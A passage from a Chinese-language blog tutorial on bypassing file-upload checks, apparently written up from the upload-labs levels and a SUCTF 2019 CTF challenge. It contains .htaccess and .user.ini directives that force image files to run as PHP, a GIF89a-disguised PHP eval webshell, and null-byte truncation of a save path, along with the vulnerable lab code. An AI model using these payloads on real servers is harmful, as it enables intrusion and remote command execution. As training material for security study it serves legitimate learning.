<p>通过一个 <code>.htaccess</code> 文件调用 php 的解析器去解析一个文件名中只要包含 “webshell.png” 这个字符串的任意文件。所以无论文件名是什么样子，只要包含 “webshell.png” 这个字符串，都可以被以 php 的方式来解析。一个自定的 <code>.htaccess</code> 文件就可以以各种各样的方式去绕过很多上传验证机制。在测试时，可以首先上传这个 <code>.htaccess</code> 文件，再上传 <code>webshell.png</code> 文件。</p>
<p>上面是匹配单个文件，其实，<code>.htaccess</code> 还可以匹配一类文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sethandler application/x-httpd-php // 将该目录和子目录吓得文件都按照 php 代码解析执行</span><br><span class="line">AddType application/x-httpd-php .xx // 将 .xx 类文件按照 php 代码解析执行</span><br><span class="line">AddHandler php5-script .xx // 将 .xx类文件按照 php 代码解析执行</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<p>upload-labs Pass-04：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// 删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// 转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// 去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// 收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>基本上把除了 <code>.htaccess</code> 文件之外的都枚举了一遍</p>
<p>就按照上面写的，先上传 <code>.htaccess</code> 文件，再上传 webshell .png </p>
<p>注意一个小细节：访问的图片地址不用改后缀：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/aebb7394bcda61455d234e46d55c65c9.png" alt="image-20240507195326574"></p>
<p>蚁剑也是如此：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fcdcf9b36e5e14e7bf458f948f2f21fa.png" alt="image-20240507195926101"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fcd2659cf4711785dd0b593c2f4c3b6f.png" alt="image-20240507195952230"></p>
</li>
<li></li>
<li><p><code>ini</code> 配置文件，常用于 nginx 服务器：</p>
<p>PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件，这样可以在每个目录下单独设置 PHP 的配置信息，而不必依赖全局的 php.ini 文件。这个功能只会被 CGI／FastCGI SAPI 处理。如果使用 Apache，则用 .htaccess 文件有同样效果。</p>
<p>除了 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
<p>在 .user.ini 风格的 INI 文件中只有具有 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的 INI 设置可被识别。除了 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的指令外，也可以使用 <code>PHP_INI_SYSTEM</code> 模式的指令。这些指令会在整个系统范围内生效。</p>
<p>用户可以通过两个新的 INI 指令 <code>user_ini.filename</code> 和 <code>user_ini.cache_ttl</code> 来控制用户 INI 文件的使用。</p>
<p>其中，<code>user_ini.filename</code> 设定了 PHP 会在每个目录下搜寻的文件名，如果设定为空字符串则 PHP 不会搜寻，默认值是 <code>.user.ini</code>。</p>
<p><code>user_ini.cache_ttl</code> 控制着重新读取用户 INI 文件的间隔时间，默认是 300 秒（5 分钟）。</p>
<p>需要注意的是，这个功能并不适用于 CLI 模式下的 PHP。</p>
<p>在使用基于目录的 INI 文件时，需要注意性能问题。如果目录层级较深，或者 <code>user_ini.cache_ttl</code> 设置的时间过短，可能会导致频繁的文件读取，影响性能。可以根据实际情况进行调整。</p>
<p>下面是对 .user.ini 的举例：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=webshell.gif <span class="comment">#先包含 webshell</span></span><br><span class="line"><span class="attr">auto_append_file</span>=webshell.gif <span class="comment">#先访问文件，再包含 webshel</span></span><br></pre></td></tr></table></figure>

<p><code>auto_prepend_file=webshell.gif</code></p>
<ul>
<li>在每个 PHP 脚本执行前自动包含一个名为 <code>webshell.gif</code> 的文件。</li>
<li>当 PHP 脚本执行时，<code>webshell.gif</code> 的文件里面的恶意脚本也会被执行。</li>
</ul>
<p><code>auto_append_file=webshell.gif</code></p>
<ul>
<li>这会在每个 PHP 脚本执行后自动包含 <code>webshell.gif</code> 文件。</li>
<li>这意味着即使原始 PHP 脚本没有问题，最终执行的代码也会执行 <code>webshell.gif</code> 的文件里面的恶意脚本。</li>
</ul>
<p>实例：</p>
<p>[SUCTF 2019]CheckIn</p>
<p>[BUUCTF在线评测 (buuoj.cn)](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SUCTF">https://buuoj.cn/challenges#[SUCTF</a> 2019]CheckIn)</p>
<p>构造 .user.ini 文件：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=webshell.gif</span><br></pre></td></tr></table></figure>

<p>由于有文件头检测。所以要加上 GIF89a 绕过：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="attr">auto_prepend_file</span>=webshell.gif</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/b21d360b8005b3de665d9ae9757eeb03.png" alt="image-20240508162857118"></p>
<p>上传成功：</p>
<img src="https://img-blog.csdnimg.cn/img_convert/d40eaab2d2dbfae6eeb951d057941a69.png" alt="image-20240508163028466"  />

<p>由于有文件内容检测，webshell.gif 的内容为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89A</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">echo</span>(<span class="number">123</span>); @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/e70b48579daea3ed21b66ecf36d5d41e.png" alt="image-20240508163525031"></p>
<p>上传成功：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/81169c73bfa771cfd9fc90826ba6ab28.png" alt="image-20240508163859784"></p>
<p>连接蚁剑：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/418e6bbb41b2e8de8b17a4efc9edab4e.png" alt="image-20240508164002022"></p>
<p>成功连接：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/17fe05ec92c96fed1907ce86ae0f80fe.png" alt="image-20240508164137198"><br>得到 flag<br><img src="https://img-blog.csdnimg.cn/img_convert/9e2e09cdbf2f3e0ef7284a3cdc9d4ffc.png" alt="image-20240508164732649"></p>
</li>
</ul>
<h5 id="白名单检测"><a href="#白名单检测" class="headerlink" title="白名单检测"></a>白名单检测</h5><p>白名单：一般情况下，代码文件里会有一个数组或者列表，该数组或者列表里会包含一些合法的字符或者字符串，如果数据包中的文件后缀不符合白名单，就不允许上传。 </p>
<h6 id="如何确认是否是白名单检测"><a href="#如何确认是否是白名单检测" class="headerlink" title="如何确认是否是白名单检测"></a>如何确认是否是白名单检测</h6><p>上传一张图片与一个自己构造的后缀，如果只能上传图片，不能上传其它后缀文件，说明是白名单检测。 </p>
<h6 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h6><p>php：php &lt; 5.3.29 且 php.ini 文件中 <code>magic_quotes_gpc=off</code></p>
<p><code>magic_quotes_gpc</code> 可在 phpstudy –&gt; 其他选项菜单 –&gt; PHP 扩展及设置 –&gt; 参数开关设置中关闭。</p>
<p>java：jdk &lt; JDK1.7.0_40</p>
<h6 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h6><ul>
<li><p>get 0x00 截断：</p>
<p>00 截断是操作系统层的漏洞，由于操作系统是 C 语言或汇编语言编写的，这两种语言在定义字符串时，都是以 \0（即 0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到 \0 字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入 \0 字符的方式，达到字符串截断的目的。</p>
<p>0x 表示 16 进制，URL 中 %00 解码成 16 进制就是 0x00 。</p>
<p>实例：</p>
<p>upload-labs Pass-12：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>
<p>中的 <code>save_path</code> 可控<br><img src="https://img-blog.csdnimg.cn/img_convert/46a6078eb10674f7d5a537619c30494e.png" alt="image-20240508101847019"><br>最终我们得到的地址为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/uploadlabs/upload/webshell.php%EF%BF%BD/7020240508101859.png</span><br></pre></td></tr></table></figure>
<p>由于存在截断，所以实际上解析到的地址是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/uploadlabs/upload/webshell.php</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ceedb400ec77154ef04b72ab8753e63a.png" alt="image-20240508102258031"></p>
</li>
<li><p>post 0x00 截断：</p>
<p>实例：</p>
<p>upload-labs Pass-13：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>

<p>中的 <code>save_path</code> 可控</p>
<p>但和 GET 对比，需要多做一次解码的工作</p>
<p>GET 型提交的内容会被自动进行 URL 解码，在 POST 请求中，%00 不会被自动解码。</p>
<p>抓包后找到 save_path ，更改值</p>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7f5e23d36cd9d6ce0bb8e4b092c1d67b.png" alt="image-20240508102822575"><img src="https://img-blog.csdnimg.cn/img_convert/eb5c2dc22ab738b2aa041ef57258a7c3.png" alt="image-20240508103440735"><br>注：编号后字符变为不可见<br><img src="https://img-blog.csdnimg.cn/img_convert/3db6911f9ca0f4dbb56d5c578aeb361c.png" alt="image-20240508102258031"></p>
<ul>
<li><p>数组拼接</p>
<p>实例：</p>
<p>upload-labs Pass-21：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">// mime check</span></span><br><span class="line">            <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// check filename</span></span><br><span class="line">                <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">                <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">                    <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">                    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                    <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                        <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>explode()</code> 函数被用来分割文件名:</p>
